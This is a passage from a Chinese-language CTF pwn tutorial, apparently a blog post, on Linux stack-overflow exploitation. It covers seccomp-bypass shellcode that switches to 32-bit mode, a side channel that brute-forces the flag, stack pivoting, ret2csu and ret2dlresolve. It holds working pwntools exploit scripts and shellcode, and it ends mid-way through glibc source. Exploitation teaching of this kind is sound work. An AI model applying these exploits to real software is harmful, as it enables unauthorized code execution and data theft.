<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov r8, 0x23</span></span><br><span class="line"><span class="string">shl r8, 0x20</span></span><br><span class="line"><span class="string">mov rax, rdi</span></span><br><span class="line"><span class="string">add rax, 0x17</span></span><br><span class="line"><span class="string">or rax, r8</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(payload, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov edx, eax</span></span><br><span class="line"><span class="string">push 0x1010101</span></span><br><span class="line"><span class="string">xor dword ptr [esp], 0x1016660</span></span><br><span class="line"><span class="string">push 0x6c662f2e</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov eax, 5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">add edx, 0x22</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(payload, arch=<span class="string">&#x27;i386&#x27;</span>, bits=<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(payload, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br></pre></td></tr></table></figure></div>
<p>这里需要注意的是：</p>
<ul>
<li>rdi 寄存器需要指向 shellcode 的地址。</li>
<li>shellcode 的地址需要小于 0x100000000 。</li>
</ul>
<h3 id="使用-shellcode-侧信道爆破-flag"><a href="#使用-shellcode-侧信道爆破-flag" class="headerlink" title="使用 shellcode 侧信道爆破 flag"></a>使用 shellcode 侧信道爆破 flag</h3><p>如果沙箱完全禁用了所有 <code>write</code> 相关的系统调用（有的题目是关闭了输出流）则需要采用 shellcode 侧信道爆破 flag 。</p>
<p>例如这道<a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/30" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>这里有一个判断进程是否退出的技巧：<code>p.recv(timeout=1)</code> 。如果进程已经结束会触发异常，而进程未结束但没有输出导致超时则接收数据长度为 0 ，并不会触发异常。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">c</span>):</span><br><span class="line">    p = process([elf.path])</span><br><span class="line">    shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            push 0x67616c66</span></span><br><span class="line"><span class="string">            mov rdi, rsp</span></span><br><span class="line"><span class="string">            xor esi, esi</span></span><br><span class="line"><span class="string">            push 2</span></span><br><span class="line"><span class="string">            pop rax</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov rdi, rax</span></span><br><span class="line"><span class="string">            mov rsi, rsp</span></span><br><span class="line"><span class="string">            mov edx, 0x100</span></span><br><span class="line"><span class="string">            xor eax, eax</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov dl, [rsp + &#123;&#125;]</span></span><br><span class="line"><span class="string">            cmp dl, &#123;&#125;</span></span><br><span class="line"><span class="string">            jbe $</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>.<span class="built_in">format</span>(i, c))</span><br><span class="line">    p.send(shellcode)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recv(timeout=<span class="number">1</span>)</span><br><span class="line">        p.kill()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    l = <span class="number">0x20</span></span><br><span class="line">    r = <span class="number">0x7f</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        m = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> check(m):</span><br><span class="line">            r = m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(l)</span><br><span class="line">    log.info(flag)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
<h3 id="使用-close-绕过-fd-参数检查"><a href="#使用-close-绕过-fd-参数检查" class="headerlink" title="使用 close 绕过 fd 参数检查"></a>使用 close 绕过 fd 参数检查</h3><p>例如这道<a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/33%20xl" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的沙箱规定 <code>read</code> 的 fd 必须为 0 ，即只能从标准输入读入。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">➜ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0005</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0005: 0x25 0x00 0x01 0x00000110  if (A &lt;= 0x110) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0009: 0x15 0x00 0x05 0x00000000  if (A != read) goto 0015</span><br><span class="line"> 0010: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # read(fd, buf, count)</span><br><span class="line"> 0011: 0x15 0x00 0x04 0x00000000  if (A != 0x0) goto 0016</span><br><span class="line"> 0012: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line"> 0013: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0016</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0015: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0017</span><br><span class="line"> 0016: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure></div>
<p>绕过方法是在 orw 之前先用 rop 调用 <code>close</code> 关闭标准输入，这样再 <code>open</code> 返回的 <code>fd</code> 就是 0 了。</p>
<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><p>栈迁移主要是为了解决栈溢出溢出空间大小不足的问题。</p>
<p>通过栈溢出将将栈中的ebp覆盖为fake_ebp-4（64位为fake_ebp-8，因为leave指令mov esp,ebp之后还有pop ebp使得esp增加），通过两次leave可以将esp的值改为fake_ebp，从而完成栈迁移，这样就可以在溢出空间不足的情况下构造完整的rop链。</p>
<h2 id="栈迁移到数据填充段"><a href="#栈迁移到数据填充段" class="headerlink" title="栈迁移到数据填充段"></a>栈迁移到数据填充段</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-stack-overflow/images/41c4d94f80c46b5ce1ddd2376a57f3d1.png"
                     
                ></p>
<p>将栈迁移到数据填充段中，执行其中的rop。</p>
<h2 id="栈迁移到其它空闲地址"><a href="#栈迁移到其它空闲地址" class="headerlink" title="栈迁移到其它空闲地址"></a>栈迁移到其它空闲地址</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-stack-overflow/images/db12ad52b7a1912665ab0bc5ed002e66.png"
                      alt="在这里插入图片描述"
                ></p>
<p>调用<code>read</code>函数将rop写入空闲地址中，然后将栈迁移到该地址执行该rop。</p>
<p>这里返回到<code>read</code>函数时会有<code>push ebp</code>保存ebp值，<code>read</code>函数中的<code>leave;ret</code>语句不会对栈迁移造成影响，因此还要再加一个<code>leave;ret</code>。</p>
<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure></div>

<p>可以看到，如果能够控制 <code>r12</code> 和 <code>r8</code> 寄存器的值就可以利用 <code>0x0000000000400609</code> 地址处的 <code>call</code> 指令执行任意函数。因此可以利用 <code>0x0000000000400616</code> 到 <code>0000000000400624</code> 的汇编指令先控制寄存器的值，然后再执行 <code>0x0000000000400600</code> 到 <code>0x0000000000400624</code> 的汇编指令调用目标函数，然后返回到主函数再次利用。</p>
<p>对应脚本如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">csu_front_addr = <span class="number">0x0000000000400600</span></span><br><span class="line">csu_end_addr = <span class="number">0x000000000040061A</span></span><br><span class="line">fakeebp = <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<p>其实，除了上述这个 gadgets，gcc 默认还会编译进去一些其它的函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_init</span><br><span class="line">_start</span><br><span class="line">call_gmon_start</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">frame_dummy</span><br><span class="line">__libc_csu_init</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_fini</span><br></pre></td></tr></table></figure></div>

<p>我们也可以尝试利用其中的一些代码来进行执行。此外，由于 PC 本身只是将程序的执行地址处的数据传递给 CPU，而 CPU 则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。</p>
<h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>需要用 ret2dlresolve 的题目的最大特征是不提供 libc 。另外如果使用 ret2dlresolve 则不能使用 patchelf 修改 elf 文件，因为这样会移动延迟绑定相关的结构。</p>
<h2 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h2><p>主要有 <code>.dynamic</code> 、<code>.dynstr</code> 、<code>.dynsym</code> 和 <code>.rel.plt</code> 四个重要的 section 。</p>
<p>结构及关系如下如图（以 32 位为例）：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-stack-overflow/images/d05fcb3f3322bf190a51a7088d9b1ad1.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="Dyn"><a href="#Dyn" class="headerlink" title="Dyn"></a>Dyn</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure></div>
<p>Dyn 结构体用于描述动态链接时需要使用到的信息，其成员含义如下：</p>
<ul>
<li><code>d_tag</code> 表示标记值，指明了该结构体的具体类型。比如，<code>DT_NEEDED</code> 表示需要链接的库名，<code>DT_PLTRELSZ</code> 表示 PLT 重定位表的大小等。</li>
<li><code>d_un</code> 是一个联合体，用于存储不同类型的信息。具体含义取决于 <code>d_tag</code> 的值。<ul>
<li>如果 <code>d_tag</code> 的值是一个整数类型，则用 <code>d_val</code> 存储它的值。</li>
<li>如果 <code>d_tag</code> 的值是一个指针类型，则用 <code>d_ptr</code> 存储它的值。</li>
</ul>
</li>
</ul>
<h3 id="Sym"><a href="#Sym" class="headerlink" title="Sym"></a>Sym</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure></div>
<p>Sym 结构体用于描述 ELF 文件中的符号（Symbol）信息，其成员含义如下：</p>
<ul>
<li><code>st_name</code>：指向一个存储符号名称的字符串表的索引，即<strong>字符串相对于字符串表起始地址的偏移</strong>。</li>
<li><code>st_info</code>：如果 <strong><code>st_other</code> 为 0</strong> 则设置成 0x12 即可。</li>
<li><code>st_other</code>：决定<strong>函数参数</strong> <code>link_map</code> 参数是否有效。如果该值不为 0 则直接通过 <code>link_map</code> 中的信息计算出目标函数地址。否则需要调用 <code>_dl_lookup_symbol_x</code> 函数查询出新的 <code>link_map</code> 和 <code>sym</code> 来计算目标函数地址。</li>
<li><code>st_value</code>：符号地址相对于模块基址的偏移值。</li>
</ul>
<h3 id="Rel"><a href="#Rel" class="headerlink" title="Rel"></a>Rel</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* I have seen two different definitions of the Elf64_Rel and</span></span><br><span class="line"><span class="comment">   Elf64_Rela structures, so we&#x27;ll leave them out until Novell (or</span></span><br><span class="line"><span class="comment">   whoever) gets their act together.  */</span></span><br><span class="line"><span class="comment">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br></pre></td></tr></table></figure></div>
<p>Rel 结构体用于描述重定位（Relocation）信息，其成员含义如下：</p>
<ul>
<li><code>r_offset</code>：加上<strong>传入的参数</strong> <code>link_map-&gt;l_addr</code> 等于该函数对应 got 表地址。</li>
<li><code>r_info</code> ：符号索引的低 8 位（32 位 ELF）或低 32 位（64 位 ELF）指示符号的类型这里设为 7 即可，高 24 位（32 位 ELF）或高 32 位（64 位 ELF）指示符号的索引即 <code>Sym</code> 构造的数组中的索引。</li>
</ul>
<h3 id="link-map"><a href="#link-map" class="headerlink" title="link_map"></a>link_map</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    ...</span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><code>link_map</code> 是存储目标函数查询结果的一个结构体，我们主要关心 <code>l_addr</code> 和 <code>l_info</code> 两个成员即可。</p>
<ul>
<li><code>l_addr</code>：目标函数所在 lib 的基址。</li>
<li><code>l_info</code>：<code>Dyn</code> 结构体指针，指向各种结构对应的 <code>Dyn</code> 。<ul>
<li><code>l_info[DT_STRTAB]</code>：即 <code>l_info</code> 数组第 5 项，指向 <code>.dynstr</code> 对应的 <code>Dyn</code> 。</li>
<li><code>l_info[DT_SYMTAB]</code>：即 <code>l_info</code> 数组第 6 项，指向 <code>Sym</code> 对应的 <code>Dyn</code> 。</li>
<li><code>l_info[DT_JMPREL]</code>：即 <code>l_info</code> 数组第 23 项，指向 <code>Rel</code> 对应的 <code>Dyn</code> 。</li>
</ul>
</li>
</ul>
<h2 id="dl-runtime-resolve-函数"><a href="#dl-runtime-resolve-函数" class="headerlink" title="_dl_runtime_resolve 函数"></a>_dl_runtime_resolve 函数</h2><p><code> _dl_runtime_resolve</code> 函数的作用可以见前面 ret2libc 中 linux 延迟绑定机制的原理介绍图。这里详细介绍的是该函数的具体实现。</p>
<p>其中 <code>_dl_runtime_resolve</code> 的核心函数位 <code>_dl_fixup</code> 函数，这里是为了避免 <code>_dl_fixup</code> 传参与目标函数传参干扰（<code>_dl_runtime_resolve</code> 函数通过栈传参然后转换成 <code>_dl_fixup</code> 的寄存器传参）以及调用目标函数才在 <code>_dl_fixup</code> 外面封装一个 <code>_dl_runtime_resolve</code> 函数。<code>_dl_fixup</code> 函数的定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_dl_fixup(truct link_map *l, ElfW(Word) reloc_arg) &#123;</span><br><span class="line">    <span class="comment">// 获取符号表地址</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="comment">// 获取字符串表地址</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">    <span class="comment">// 获取函数对应的重定位表结构地址，sizeof (PLTREL) 即 Elf*_Rel 的大小。</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> reloc_offset reloc_arg * sizeof (PLTREL)</span></span><br><span class="line">    <span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 获取函数对应的符号表结构地址</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 得到函数对应的got地址，即真实函数地址要填回的地址</span></span><br><span class="line">    <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *) (l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">    <span class="type">lookup_t</span> result;</span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断重定位表的类型，必须要为 ELF_MACHINE_JMP_SLOT(7)</span></span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">       used don&#x27;t look in the global scope.  */</span></span><br><span class="line">    <span class="comment">// ☆ 关键判断，决定目标函数地址的查找方法。☆</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">                version = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">       not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">       we are not using any threads (yet).  */</span></span><br><span class="line">        <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) &#123;</span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="comment">// 查找目标函数地址</span></span><br><span class="line">        <span class="comment">// result 为 libc 的 link_map 